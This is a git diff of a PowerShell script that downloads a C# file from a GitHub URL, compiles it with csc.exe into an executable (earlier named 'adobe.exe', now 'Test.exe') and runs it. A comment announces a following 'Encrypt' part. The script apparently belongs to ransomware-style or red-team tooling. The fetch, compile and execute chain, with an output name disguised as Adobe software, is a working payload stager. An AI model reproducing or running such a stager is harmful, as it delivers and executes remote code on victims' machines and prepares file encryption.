@@ -5,9 +5,9 @@ $b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.Credent
 $my_path="D:\cexec.cs"
 $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/cexec.cs';
 $b.DownloadFile($url, $my_path) ;
-$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\adobe.exe D:\cexec.cs"
+$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\Test.exe D:\cexec.cs"
 invoke-expression $command
-$command1="cmd /C D:\adobe.exe"
+$command1="cmd /C D:\Test.exe"
 #invoke-expression $command
 
 #Part 2 - Encrypt
